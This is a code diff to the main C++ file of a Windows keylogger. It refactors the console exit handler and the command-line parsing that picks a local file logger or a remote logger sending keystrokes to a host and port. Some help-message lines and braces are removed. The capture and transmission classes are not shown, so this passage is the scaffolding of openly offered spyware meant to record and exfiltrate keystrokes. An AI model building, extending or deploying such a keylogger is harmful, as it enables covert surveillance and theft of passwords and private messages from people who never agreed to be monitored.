@@ -14,11 +14,19 @@ bool g_store_character;
 
 int g_timer = DEFAULT_VALUE_TIMER;
 
-BOOL exit_program()
+BOOL WINAPI ExitProgram(DWORD dwCtrlType)
 {
-	delete g_keylogger;
+	cout << "ExitProgram" << endl;
 
-	exit (EXIT_FAILURE);
+	if (dwCtrlType == CTRL_CLOSE_EVENT)
+	{
+		delete g_keylogger;
+
+		exit(EXIT_FAILURE);
+		return true;
+	}
+
+	return false;
 }
 
 void initialize_options(int p_arguments_number, char** p_arguments_value)
@@ -61,41 +69,27 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 			case 0:
 				if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_LOCAL)
 				    == 0)
-				{
 					g_keylogger = new keylogger_local(optarg);
-				}
 				else if (strcasecmp(t_long_options[t_option_index].name,
 					LONG_OPTION_REMOTE) == 0)
-				{
 						g_keylogger = new keylogger_remote(p_arguments_value[t_option_index + 1], atoi(p_arguments_value[t_option_index + 2]));
-				}
 				else if (strcasecmp(t_long_options[t_option_index].name,
 					LONG_OPTION_HELP) == 0)
 				{
 						print_help();
 
-						exit_program();
+						ExitProgram(CTRL_CLOSE_EVENT);
 				}
-				else if (strcasecmp(t_long_options[t_option_index].name,
-					LONG_OPTION_BUFFER_SIZE) == 0)
-				{
+				else if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_BUFFER_SIZE) == 0)
 					g_buffer_size = atoi(optarg);
-				}
-				else if (strcasecmp(t_long_options[t_option_index].name,
-					LONG_OPTION_NO_CLICK) == 0)
-				{
+				else if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_NO_CLICK) == 0)
 					g_no_click = true;
-				}
 				else if (strcasecmp(t_long_options[t_option_index].name,
 					LONG_OPTION_ALPHABET_ONLY) == 0)
-				{
 					g_alphabet_only = true;
-				}
 				else if (strcasecmp(t_long_options[t_option_index].name,
 					LONG_OPTION_STORE_CHARACTER) == 0)
-				{
 					g_store_character = true;
-				}
 			break;
 
 			case SHORT_OPTION_LOCAL:
@@ -129,7 +123,7 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 			case SHORT_OPTION_HELP:
 				print_help();
 
-				exit_program();
+				ExitProgram(CTRL_CLOSE_EVENT);
 			break;
 
 
@@ -164,9 +158,6 @@ void print_help()
 	cout << HELP_MESSAGE_STORE_CHARACTER << endl;
 	cout << HELP_MESSAGE_STORE_CHARACTER_EXAMPLE << endl;
 	cout << endl;
-	cout << HELP_MESSAGE_TIMER << endl;
-	cout << HELP_MESSAGE_TIMER_EXAMPLE << endl;
-	cout << endl;
 	cout << HELP_MESSAGE_HELP << endl;
 	cout << HELP_MESSAGE_HELP_EXAMPLE << endl;
 	cout << endl;
@@ -175,7 +166,7 @@ void print_help()
 
 int main(int p_arguments_number, char** p_arguments_value)
 {
-	if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE) exit_program, TRUE))
+	if (!SetConsoleCtrlHandler(ExitProgram, TRUE))
 	{
 		cerr << ERROR_MESSAGE_SETCONTROLECTRLHANDLER << endl;
 		return EXIT_FAILURE;
@@ -186,11 +177,8 @@ int main(int p_arguments_number, char** p_arguments_value)
 	if(g_keylogger != nullptr)
 	{
 		g_keylogger->set_buffer_size(g_buffer_size);
-
 		g_keylogger->set_no_click(g_no_click);
-
 		g_keylogger->set_alphabet_only(g_alphabet_only);
-
 		g_keylogger->set_store_character(g_store_character);
 
 		g_keylogger->start();
